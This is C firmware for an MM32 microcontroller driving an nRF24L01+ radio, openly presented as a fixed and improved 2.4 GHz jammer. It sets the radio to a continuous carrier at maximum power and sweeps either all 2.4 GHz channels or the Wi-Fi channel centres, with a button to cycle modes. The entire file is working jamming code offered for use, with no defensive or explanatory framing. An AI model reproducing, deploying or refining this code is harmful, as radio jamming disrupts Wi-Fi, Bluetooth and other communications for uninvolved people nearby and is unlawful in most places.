/*
 * 2.4 GHz Jammer � MM32 Port (FIXED & IMPROVED)
 * ------------------------------------------------
 * Major fixes:
 *   - Proper carrier re-arming after mode change
 *   - Non-blocking attack sweeps (small steps per main loop iteration)
 *   - Better PLL settling and CE management
 *   - Cleaner state machine
 */

#define _MAIN_C_
#include <stdio.h>
#include "platform.h"
#include "spi_master_polling.h"
#include "main.h"
#include "RF24.h"

/* -- Pin aliases -- */
#define WS_PIN          GPIO_Pin_0      /* PA0 - WS2812 */
#define BUTTON_PIN      GPIO_Pin_1      /* PB1 - Button (active LOW) */
#define JAMMER_CE_PIN   GPIO_Pin_2      /* PA2 - CE */

/* Local CE macros to avoid conflict with RF24 library */
#define JAMMER_CE_HIGH()    GPIO_SetBits(GPIOA, JAMMER_CE_PIN)
#define JAMMER_CE_LOW()     GPIO_ResetBits(GPIOA, JAMMER_CE_PIN)

/* nRF24L01+ RF_SETUP bits for Continuous Carrier */
#define NRF_REG_RF_SETUP_ADDR   0x06u
#define CONT_WAVE_BIT           (1u << 7)
#define PLL_LOCK_BIT            (1u << 4)

/* Wi-Fi channels (center freq - 2400) */
static const uint8_t wifi_channels[] = {
    12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62
};
#define WIFI_CH_COUNT   ((uint8_t)(sizeof(wifi_channels)/sizeof(wifi_channels[0])))

typedef enum {
    MODE_ALL = 0,   /* All 2.4 GHz channels - RED */
    MODE_WIFI = 1,  /* Wi-Fi only - ORANGE */
    MODE_IDLE = 2   /* Idle (carrier on ch 76) - GREEN */
} AttackMode;

static AttackMode g_mode = MODE_IDLE;
static uint8_t    g_current_ch = 0;        /* for non-blocking sweep */
static uint8_t    g_sweep_index = 0;       /* for WiFi sweep */

/* -----------------------------------------------------------
 * WS2812 LED (single LED on PA0)
 * ----------------------------------------------------------- */
static void WS2812_Init(void)
{
    GPIO_InitTypeDef g;
    RCC_AHBPeriphClockCmd(RCC_AHBPERIPH_GPIOA, ENABLE);
    GPIO_StructInit(&g);
    g.GPIO_Pin = WS_PIN;
    g.GPIO_Mode = GPIO_Mode_Out_PP;
    g.GPIO_Speed = GPIO_Speed_High;
    GPIO_Init(GPIOA, &g);
    GPIO_ResetBits(GPIOA, WS_PIN);
}

static void WS2812_SendBit(uint8_t bit)
{
    if (bit) {
        GPIO_SetBits(GPIOA, WS_PIN); __NOP();__NOP();__NOP();__NOP();__NOP();
        GPIO_ResetBits(GPIOA, WS_PIN); __NOP();__NOP();
    } else {
        GPIO_SetBits(GPIOA, WS_PIN); __NOP();__NOP();
        GPIO_ResetBits(GPIOA, WS_PIN); __NOP();__NOP();__NOP();__NOP();__NOP();
    }
}

static void WS2812_SendByte(uint8_t byte)
{
	int i;
    for (i = 7; i >= 0; i--)
        WS2812_SendBit((byte >> i) & 1);
}

static void WS2812_SetColor(uint8_t r, uint8_t g, uint8_t b)
{
    __disable_irq();
    WS2812_SendByte(g); WS2812_SendByte(r); WS2812_SendByte(b);
    __enable_irq();
    Delay_ms(1);   /* reset latch */
}

static void LED_Red(void)    { WS2812_SetColor(255, 0, 0); }
static void LED_Orange(void) { WS2812_SetColor(255, 80, 0); }
static void LED_Green(void)  { WS2812_SetColor(0, 255, 0); }
static void LED_Off(void)    { WS2812_SetColor(0, 0, 0); }

/* -----------------------------------------------------------
 * Button
 * ----------------------------------------------------------- */
static void Button_Init(void)
{
    GPIO_InitTypeDef g;
    RCC_AHBPeriphClockCmd(RCC_AHBPERIPH_GPIOB, ENABLE);
    GPIO_StructInit(&g);
    g.GPIO_Pin = BUTTON_PIN;
    g.GPIO_Mode = GPIO_Mode_IPU;
    g.GPIO_Speed = GPIO_Speed_High;
    GPIO_Init(GPIOB, &g);
}

static uint8_t Button_IsPressed(void)
{
    return (GPIO_ReadInputDataBit(GPIOB, BUTTON_PIN) == 0);
}

/* -----------------------------------------------------------
 * Board & SPI Init
 * ----------------------------------------------------------- */
static void Free_JTAG_Pins(void)
{
#ifdef GPIO_Remap_SWJ_JTAGDisable
    RCC_APB1PeriphClockCmd(RCC_APB1PERIPH_AFIO, ENABLE);
    GPIO_PinRemapConfig(GPIO_Remap_SWJ_JTAGDisable, ENABLE);
#endif
}

static void Board_SPI_Init(void)
{
    GPIO_InitTypeDef g;
    SPI_InitTypeDef s;

    RCC_AHBPeriphClockCmd(RCC_AHBPERIPH_GPIOA, ENABLE);
    RCC_APB1PeriphClockCmd(RCC_APB1PERIPH_SPI1, ENABLE);
    Free_JTAG_Pins();

    /* SPI pins */
    GPIO_PinAFConfig(GPIOA, GPIO_PinSource8, GPIO_AF_0);  /* SCK  PA8 */
    GPIO_PinAFConfig(GPIOA, GPIO_PinSource9, GPIO_AF_0);  /* MOSI PA9 */
    GPIO_PinAFConfig(GPIOA, GPIO_PinSource10, GPIO_AF_0); /* MISO PA10 */

    GPIO_StructInit(&g);
    g.GPIO_Pin   = GPIO_Pin_8 | GPIO_Pin_9;
    g.GPIO_Mode  = GPIO_Mode_AF_PP;
    g.GPIO_Speed = GPIO_Speed_High;
    GPIO_Init(GPIOA, &g);

    g.GPIO_Pin = GPIO_Pin_10;
    g.GPIO_Mode = GPIO_Mode_FLOATING;
    GPIO_Init(GPIOA, &g);

    /* CSN + CE */
    g.GPIO_Pin  = GPIO_Pin_15 | JAMMER_CE_PIN;
    g.GPIO_Mode = GPIO_Mode_Out_PP;
    GPIO_Init(GPIOA, &g);

    GPIO_SetBits(GPIOA, GPIO_Pin_15);   /* CSN idle HIGH */
    GPIO_ResetBits(GPIOA, JAMMER_CE_PIN); /* CE idle LOW */

    SPI_StructInit(&s);
    s.SPI_Mode = SPI_Mode_Master;
    s.SPI_DataSize = SPI_DataSize_8b;
    s.SPI_CPOL = SPI_CPOL_Low;
    s.SPI_CPHA = SPI_CPHA_1Edge;
    s.SPI_NSS = SPI_NSS_Soft;
    s.SPI_BaudRatePrescaler = SPI_BaudratePrescaler_64;
    s.SPI_FirstBit = SPI_FirstBit_MSB;
    SPI_Init(SPI1, &s);
    SPI_Cmd(SPI1, ENABLE);
}

/* -----------------------------------------------------------
 * Continuous Carrier Helpers
 * ----------------------------------------------------------- */
static void NRF_StartConstCarrier(uint8_t channel)
{
    JAMMER_CE_LOW();
    Delay_ms(2);

    RF24_setChannel(channel);

    uint8_t rf_setup = RF24_read_register(NRF_REG_RF_SETUP_ADDR);
    rf_setup |= (CONT_WAVE_BIT | PLL_LOCK_BIT);
    RF24_write_register(NRF_REG_RF_SETUP_ADDR, rf_setup);

    JAMMER_CE_HIGH();
    Delay_ms(2);        /* Tstby2a + PLL lock */
}

static void NRF_StopConstCarrier(void)
{
    JAMMER_CE_LOW();
    Delay_ms(2);

    uint8_t rf_setup = RF24_read_register(NRF_REG_RF_SETUP_ADDR);
    rf_setup &= ~(CONT_WAVE_BIT | PLL_LOCK_BIT);
    RF24_write_register(NRF_REG_RF_SETUP_ADDR, rf_setup);
}

/* -----------------------------------------------------------
 * Non-blocking Attack Sweeps
 * ----------------------------------------------------------- */
static void DoAttackAll(void)
{
    RF24_setChannel(g_current_ch);
    Delay_ms(2);                     /* PLL settle + jamming dwell */

    g_current_ch++;
    if (g_current_ch >= 125)
        g_current_ch = 0;
}

static void DoAttackWifi(void)
{
    RF24_setChannel(wifi_channels[g_sweep_index]);
    Delay_ms(3);                     /* slightly longer dwell on WiFi channels */

    g_sweep_index++;
    if (g_sweep_index >= WIFI_CH_COUNT)
        g_sweep_index = 0;
}

/* -----------------------------------------------------------
 * Main
 * ----------------------------------------------------------- */
int main(void)
{
    uint8_t btn_prev = 0;
    uint8_t btn_curr = 0;

    InitDelay();
    Serial_begin(115200);
    printf("\r\n=== 2.4 GHz Jammer MM32 (Fixed) ===\r\n");

    Board_SPI_Init();
    WS2812_Init();
    Button_Init();

    if (!RF24_begin()) {
        printf("RF24_begin() FAILED! Check wiring.\r\n");
        while (1) {
            LED_Red(); Delay_ms(150);
            LED_Off(); Delay_ms(150);
        }
    }

    printf("RF24 OK\r\n");

    /* Initial configuration */
    RF24_setAutoAck(0);
    RF24_stopListening();
    RF24_setRetries(0, 0);
    RF24_setPayloadSize(5);
    RF24_setAddressWidth(3);
    RF24_setPALevel(RF24_PA_MAX);
    RF24_setDataRate(RF24_2MBPS);
    RF24_setCRCLength(RF24_CRC_DISABLED);   /* Must be last */

    RF24_printDetails();

    /* Start in IDLE */
    g_mode = MODE_IDLE;
    LED_Green();
    NRF_StartConstCarrier(76);
    printf("IDLE (GREEN) - Press button to cycle\r\n");

    while (1)
    {
        /* Button handling with debounce */
        btn_curr = Button_IsPressed();
        if (btn_curr && !btn_prev) {
            Delay_ms(25);                     /* debounce */
            if (Button_IsPressed()) {
                NRF_StopConstCarrier();

                g_mode = (AttackMode)((g_mode + 1) % 3);
                g_current_ch = 0;
                g_sweep_index = 0;

                switch (g_mode) {
                    case MODE_ALL:
                        printf("MODE: ALL 2.4 GHz (RED)\r\n");
                        LED_Red();
                        NRF_StartConstCarrier(0);      /* re-arm carrier */
                        break;

                    case MODE_WIFI:
                        printf("MODE: Wi-Fi only (ORANGE)\r\n");
                        LED_Orange();
                        NRF_StartConstCarrier(wifi_channels[0]);
                        break;

                    case MODE_IDLE:
                    default:
                        printf("MODE: IDLE (GREEN)\r\n");
                        LED_Green();
                        NRF_StartConstCarrier(76);
                        break;
                }

                /* Wait for button release */
                while (Button_IsPressed()) Delay_ms(5);
            }
        }
        btn_prev = btn_curr;

        /* Execute current mode (non-blocking) */
        switch (g_mode) {
            case MODE_ALL:
                DoAttackAll();
                break;

            case MODE_WIFI:
                DoAttackWifi();
                break;

            case MODE_IDLE:
            default:
                Delay_ms(10);
                break;
        }
    }
}